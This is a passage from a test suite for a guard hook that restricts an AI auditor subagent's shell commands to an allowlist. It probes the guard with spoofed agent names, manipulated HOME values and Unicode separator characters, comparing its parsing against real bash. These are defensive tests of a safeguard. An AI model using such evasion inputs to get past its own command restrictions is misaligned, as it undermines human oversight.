    ["absent", undefined], ["null", null], ["empty string", ""], ["number", 5], ["boolean", true], ["object", { name: "stacks-auditor" }], ["array", ["stacks-auditor"]],
    ["general-purpose", "general-purpose"], ["upper case", "Stacks-Auditor"], ["namespaced, upper case agent", "azure-terraform-stacks:Stacks-Auditor"],
    ["namespaced, upper case plugin", "Azure-Terraform-Stacks:stacks-auditor"], ["other plugin", "other-plugin:stacks-auditor"], ["extra segment after", "azure-terraform-stacks:stacks-auditor:x"],
    ["extra segment before", "x:azure-terraform-stacks:stacks-auditor"], ["suffix", "stacks-auditor-2"], ["namespaced suffix", "azure-terraform-stacks:stacks-auditor-2"],
    ["only the namespace", "azure-terraform-stacks:"], ["leading space", " azure-terraform-stacks:stacks-auditor"], ["trailing space", "azure-terraform-stacks:stacks-auditor "],
    ["trailing tab", "stacks-auditor\t"], ["leading tab", "\tstacks-auditor"], ["leading no-break space", "\u00a0stacks-auditor"], ["trailing no-break space", "azure-terraform-stacks:stacks-auditor\u00a0"],
    ["trailing newline", "stacks-auditor\n"], ["slash instead of colon", "azure-terraform-stacks/stacks-auditor"],
  ];
  for (const [name, value] of cases) {
    const input = { ...FIXTURE, cwd: AUDITED, tool_input: { command: "terraform apply" } };
    if (value === undefined) delete input.agent_type; else input.agent_type = value;
    const r = run(input);
    assert.equal(r.code, 0, `agent_type ${name} (${JSON.stringify(value)}) must not be touched: ${r.stderr}`);
    assert.equal(r.stdout + r.stderr, "", `agent_type ${name} must print nothing`);
  }
});

test("the plugin and agent names in the guard are the ones in plugin.json and in the agent's frontmatter, and the accepted list is exactly the two literals", () => {
  const pluginName = JSON.parse(readFileSync(join(PLUGIN, ".claude-plugin", "plugin.json"), "utf8")).name;
  const front = /^---\n([\s\S]*?)\n---/.exec(AGENT)?.[1] ?? "";
  const agentName = /^name:\s*(\S+)\s*$/m.exec(front)?.[1];
  assert.equal(GUARD_PLUGIN, pluginName, "PLUGIN of the guard must equal name in plugin.json");
  assert.equal(GUARD_AGENT, agentName, "AGENT of the guard must equal name in agents/stacks-auditor.md");
  assert.deepEqual([...AGENTS].sort(), [agentName, `${pluginName}:${agentName}`].sort());
  assert.equal(`${GUARD_PLUGIN}:${GUARD_AGENT}`, REAL_AGENT_TYPE, "the live capture of 2026-11-24");
});

// ---- the home directory the guard judges must be the one `~` expands to ----
test("home check: an empty HOME denies every command of the auditor, and the reason names HOME", () => {
  for (const cmd of ["node --version", `node ${ENGINE} audit --root ${AUDITED}`, "ls -d ~/x", "terraform --version"]) {
    for (const agent_type of ["stacks-auditor", REAL_AGENT_TYPE]) {
      const r = fromFixture(cmd, { agent_type, env: { HOME: "" } });
      assert.equal(r.code, 2, `${cmd} with an empty HOME`);
      assert.match(r.stderr, /HOME/);
    }
  }
});

test("home check: HOME equal to the home directory decides as usual; HOME not defined adds no denial", () => {
  const same = fromFixture("node --version", { env: { HOME, USERPROFILE: HOME } });
  assert.equal(same.code, 0, same.stderr);
  assert.equal(fromFixture(`node ${USER_ENGINE} audit --json`, { env: { HOME, USERPROFILE: HOME } }).code, 0);
  const unset = fromFixture("node --version", { env: { HOME: undefined } });
  assert.equal(unset.code, 0, `HOME undefined: ${unset.stderr}`);
  assert.doesNotMatch(unset.stderr, /HOME/);
  assert.equal(fromFixture("terraform --version", { env: { HOME: undefined } }).code, 2, "the allowlist still applies when HOME is undefined");
});

test("home check: HOME that differs from os.homedir(), or is relative, denies (unit, with injected values)", () => {
  const input = (agent_type) => ({ ...FIXTURE, agent_type, cwd: AUDITED, tool_input: { command: "node --version" } });
  const here = resolve(HOME);
  const other = resolve(HOME, "..", "somewhere-else");
  for (const agent_type of ["stacks-auditor", REAL_AGENT_TYPE]) {
    assert.equal(guard(input(agent_type), { env: { HOME: other }, home: here }).allow, false);
    assert.equal(guard(input(agent_type), { env: { HOME: "" }, home: here }).allow, false);
    assert.equal(guard(input(agent_type), { env: { HOME: "" }, home: "" }).allow, false, "an empty HOME is denied even when homedir() also returns empty");
    assert.equal(guard(input(agent_type), { env: { HOME: "rel/home" }, home: "rel/home" }).allow, false, "a relative HOME is not a home directory");
    assert.match(guard(input(agent_type), { env: { HOME: other }, home: here }).reason, /HOME/);
    assert.equal(guard(input(agent_type), { env: { HOME: here }, home: here }).allow, true);
    assert.equal(guard(input(agent_type), { env: {}, home: here }).allow, true, "HOME not defined: no denial");
  }
  // not the auditor: never touched, whatever HOME is
  assert.equal(guard({ ...input("general-purpose"), tool_input: { command: "terraform apply" } }, { env: { HOME: "" }, home: here }).allow, true);
  assert.equal(guard({ tool_name: "Bash", tool_input: { command: "terraform apply" } }, { env: { HOME: "" }, home: here }).allow, true);
});

test("home check: another agent with an empty HOME exits 0 and prints nothing", () => {
  for (const agent_type of ["general-purpose", "other-plugin:stacks-auditor", ""]) {
    const r = fromFixture("terraform apply", { agent_type, env: { HOME: "" } });
    assert.equal(r.code, 0);
    assert.equal(r.stdout + r.stderr, "");
  }
});

test("os.homedir() with an empty HOME is either empty or the password database's home; the guard denies in both cases", () => {
  const r = spawnSync(process.execPath, ["-e", "process.stdout.write(JSON.stringify(require('node:os').homedir()))"], { encoding: "utf8", env: { ...process.env, HOME: "" } });
  assert.equal(r.status, 0);
  assert.equal(typeof JSON.parse(r.stdout), "string");
  assert.equal(fromFixture("node --version", { env: { HOME: "" } }).code, 2);
});

// ---- NIT (a): Unicode spaces and other separators the shell does not split on, checked against the real bash ----
const UNICODE_SPACES = [
  "\u00a0", "\u1680", "\u2000", "\u2001", "\u2002", "\u2003", "\u2004", "\u2005", "\u2006", "\u2007", "\u2008", "\u2009", "\u200a",
  "\u202f", "\u205f", "\u3000", "\u0085", "\u2028", "\u2029", "\u200b", "\u200c", "\u200d", "\u2060", "\ufeff", "\u180e",
];
const unicodeCorpus = (c) => [
  // (i) where a space would separate arguments
  `ls${c}-d a`, `ls -d${c}a`, `ls -d a${c}b`, `ls -d a ${c} b`, `test${c}-f a`, `test -f${c}a`, `test -d${c}rel`,
  `node ${ENGINE}${c}audit`, `node ${ENGINE} audit${c}--json`, `node ${ENGINE} audit --json${c}`, `node ${ENGINE} audit --root${c}rel`, `node${c}${ENGINE} audit`,
  `npm ci --prefix${c}${SKILL_DIR} --omit=dev --ignore-scripts`, `npm ci --prefix ${SKILL_DIR} --omit=dev${c}--ignore-scripts`,
  // (ii) inside a path, and at its edges
  `ls -d a${c}b c`, `ls -d ${c}a`, `ls -d a${c}`, `ls -d rel${c}/x`, `ls -d rel/${c}x`, `test -f a${c}b`, `test -d re${c}l`,
  `node ${ENGINE} audit --root re${c}l`, `node ${ENGINE} audit --root rel${c}`, `node ${ENGINE} audit --root ${c}rel`, `node ${ENGINE}${c} audit`, `node ${ENGINE.slice(0, -4)}${c}.mjs audit`,
  `npm ci --prefix ${SKILL_DIR}${c} --omit=dev --ignore-scripts`,
  // (iii) next to --root, --json, ~/ and audit
  `node ${ENGINE} audit --root${c}`, `node ${ENGINE} audit --jso${c}n`, `node ${ENGINE} audit${c}`, `node ${ENGINE} aud${c}it`, `node ${ENGINE} ${c}audit`,
  `ls -d ~/${c}x`, `ls -d ~${c}/x`, `ls -d ${c}~/x`, `ls -d a${c}~/x`, `ls -d ~/x${c}~/y`, `ls -d ~/.gemini/skills${c}`, `test -d ~/${c}`,
  `node ~/.gemini/skills/azure-terraform-stacks/scripts/stacks.mjs${c}audit`, `node ~/.gemini/skills/azure-terraform-stacks/scripts/stacks.mjs audit --root ~/${c}x`,
];
const argvOf = (cmd, cwd, locale) => {
  const r = spawnSync("bash", ["-c", `printf '%s\\0' ${cmd}`], { cwd, env: { PATH: process.env.PATH, HOME, ...(locale ? { LC_ALL: locale } : {}) }, encoding: "utf8" });
  return r.status === 0 ? r.stdout.split("\0").slice(0, -1) : null;
};

test("differential (Unicode spaces): for every command the guard approves, one argv word per guard token and the same paths as the real bash, in the C and UTF-8 locales", (t) => {
  if (process.platform === "win32") return t.skip("needs bash");
  const repo = hostileTilde();
  mkdirSync(join(repo, "rel"), { recursive: true });
  const ctx = { cwd: repo, home: HOME };
  let approved = 0, denied_ = 0;
  for (const c of UNICODE_SPACES) {
    const hex = `U+${c.codePointAt(0).toString(16).toUpperCase().padStart(4, "0")}`;
    for (const cmd of unicodeCorpus(c)) {
      if (!decide(cmd, ctx).allow) { denied_++; continue; }
      approved++;
      const tokens = cmd.split(/[ \t]+/).filter(Boolean);
      for (const locale of [undefined, "C", "C.UTF-8"]) {
        const argv = argvOf(cmd, repo, locale);
        const where = `${hex} in ${JSON.stringify(cmd)} (locale ${locale ?? "default"})`;
        assert.ok(argv, `bash could not run ${where}`);
        assert.equal(argv.length, tokens.length, `the shell splits differently from the guard: ${where}`);
        const real = shellPaths(argv).map((x) => resolve(repo, x));
        assert.deepEqual(pathsOf(cmd, ctx), real, `guard and shell disagree: ${where}`);
      }
    }
  }
  assert.ok(approved >= UNICODE_SPACES.length, `the corpus must exercise approved commands with these characters (${approved})`);
  assert.ok(denied_ > 0, "and denied ones");
});

test("Unicode spaces: a word that holds one stays one word (a path), never two", () => {
  // the guard splits on space and tab only; the mutation `split(/\s+/)` would make `a<NBSP>b` two paths
  const ctx = { cwd: AUDITED, home: HOME };
  for (const c of UNICODE_SPACES) {
    const cmd = `ls -d a${c}b`;
    if (decide(cmd, ctx).allow) assert.deepEqual(pathsOf(cmd, ctx), [resolve(AUDITED, `a${c}b`)], `U+${c.codePointAt(0).toString(16)}`);
  }
});

// ---- Review cycle 1: the guard must not throw outside its try ----
test("os.homedir() throwing (HOME undefined, uid without a passwd entry): the auditor is denied with exit-2 semantics, anyone else is untouched", () => {
  const boom = () => { throw new Error("uv_os_homedir returned ENOENT"); };
  for (const agent_type of ["stacks-auditor", REAL_AGENT_TYPE]) {
    const r = guard({ ...FIXTURE, agent_type, cwd: AUDITED, tool_input: { command: "node --version" } }, { env: {}, homeOf: boom });
    assert.equal(r.allow, false);
    assert.match(r.reason, /the guard failed on this command/);
  }
  for (const agent_type of [undefined, null, "", "general-purpose", "other-plugin:stacks-auditor"]) {
    assert.doesNotThrow(() => guard({ ...FIXTURE, agent_type, tool_input: { command: "terraform apply" } }, { env: {}, homeOf: boom }));
    assert.equal(guard({ ...FIXTURE, agent_type, tool_input: { command: "terraform apply" } }, { env: {}, homeOf: boom }).allow, true);
  }
  // another tool of the auditor is not evaluated, so homedir() is not needed either
  assert.equal(guard({ ...FIXTURE, tool_name: "Write", cwd: AUDITED }, { env: {}, homeOf: boom }).allow, true);
});

test("tool_name: Write is never touched; an absent tool_name is evaluated like Bash (current behavior, kept on purpose)", () => {
  const base = { ...FIXTURE, cwd: AUDITED };
  for (const agent_type of ["stacks-auditor", REAL_AGENT_TYPE]) {
    const w = run({ ...base, agent_type, tool_name: "Write", tool_input: { command: "terraform apply" } });
    assert.equal(w.code, 0);
    assert.equal(w.stdout + w.stderr, "");
    // Claude Code sends tool_name for a Bash matcher; if it were ever absent the guard judges the command by the allowlist instead of letting it pass
    const noTool = { ...base, agent_type, tool_input: { command: "terraform apply" } };
    delete noTool.tool_name;
    assert.equal(run(noTool).code, 2, "absent tool_name, forbidden command: denied");
    noTool.tool_input = { command: "node --version" };
    assert.equal(run(noTool).code, 0, "absent tool_name, allowed command: allowed");
  }
});
